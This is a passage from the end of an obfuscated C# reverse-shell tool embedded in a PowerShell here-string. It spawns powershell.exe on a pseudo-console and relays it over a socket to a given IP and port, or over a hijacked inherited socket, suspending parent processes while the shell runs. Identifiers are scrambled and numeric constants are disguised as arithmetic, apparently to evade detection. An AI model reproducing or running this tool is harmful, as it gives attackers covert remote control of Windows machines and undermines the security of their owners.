            CreateProcess(null, XRiY0H, IntPtr.Zero, IntPtr.Zero, true, $(26 + -26), IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }
        // Note: We can close the handles to the PTY-end of the pipes here
        // because the handles are dup'ed into the ConHost and will be released
        // when the ConPTY is destroyed.
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        if (uDr8EShell) {
            // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process
            if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);
            if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, $(-12 -bxor -11));
        }
        //Threads have better performance than Tasks
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);
        // wait for the child process until exit
        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);
        //cleanup everything
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        if (uDr8EShell)
        {
            if (!IsSocketOverlapped)
            {
                // cancelling the event selection for the socket
                WSAEventSelect(shellSocket, IntPtr.Zero, $(-79 -bxor -79));
                SocketHijacking.SetSocketBlockingMode(shellSocket, $(-41 -bxor -41));
            }
            if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);
            if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);
        }
        closesocket(shellSocket);
        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
        if (newConsoleAllocated)
            FreeConsole();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
        output += "CPTSH kindly exited.\r\n";
        return output;
    }
}

public static class CPTSHMainClass
{
    private static string help = @"";

    private static bool HelpRequired(string param)
    {
        return param == "-h" || param == "--help" || param == "/?";
    }

    private static void CheckArgs(string[] arguments)
    {
        if (arguments.Length < $(72 / 36))
            throw new CPTSHException("\r\nCPTSH: Not enough arguments. (18 / 9) Arguments required. Use --help for additional help.\r\n");
    }

    private static void DisplayHelp()
    {
        Console.Out.Write(help);
    }

    private static string Check$MklM3XArg(string ipString)
    {
        IPAddress address;
        if (!IPAddress.TryParse(ipString, out address))
            throw new CPTSHException("\r\nCPTSH: Invalid $MklM3X value" + ipString);
        return ipString;
    }

    private static int CheckInt(string arg)
    {
        int ret = $(94 + -94);
        if (!Int32.TryParse(arg, out ret))
            throw new CPTSHException("\r\nCPTSH: Invalid integer value " + arg);
        return ret;
    }

    private static uint Parserz5xe(string[] arguments)
    {
        uint rz5xe = $(-744 / -31);
        if (arguments.Length > $(-34 / -17))
            rz5xe = (uint)CheckInt(arguments[$(15 % 13)]);
        return rz5xe;
    }

    private static uint Parsep9uoQwmq(string[] arguments)
    {
        uint p9uoQwmq = $(2 * 40);
        if (arguments.Length > $(-84 -bxor -81))
            p9uoQwmq = (uint)CheckInt(arguments[$(-6 + 9)]);
        return p9uoQwmq;
    }

    private static string ParseXRiY0H(string[] arguments)
    {
        string XRiY0H = "powershell.exe";
        if (arguments.Length > $(208 % 102))
            XRiY0H = arguments[$(82 -bxor 86)];
        return XRiY0H;
    }

    public static string CPTSHMain(string[] args)
    {
        string output = "";
        if (args.Length == $(-17 + 18) && HelpRequired(args[$(-20 + 20)]))
        {
            DisplayHelp();
        }
        else
        {
            string $MklM3X = "";
            int KCYCqBu = $(87 + -87);
            bool uDr8EShell = false;
            try
            {
                CheckArgs(args);
                if (args[$(250 % 50)].Contains("uDr8E"))
                    uDr8EShell = true;
                else
                {
                    $MklM3X = Check$MklM3XArg(args[$(11 - 11)]);
                    KCYCqBu = CheckInt(args[$(76 + -75)]);
                }
                uint rz5xe = Parserz5xe(args);
                uint p9uoQwmq = Parsep9uoQwmq(args);
                string XRiY0H = ParseXRiY0H(args);
                output = CPTSH.SpawnCPTSH($MklM3X, KCYCqBu, rz5xe, p9uoQwmq, XRiY0H, uDr8EShell);
            }
            catch (Exception e)
            {
                Console.WriteLine("\n" + e.ToString() + "\n");
            }
        }
        return output;
    }
}


class MainClass
{
    static void Main(string[] args)
    {
        Console.Out.Write(CPTSHMainClass.CPTSHMain(args));
    }
}

"@;
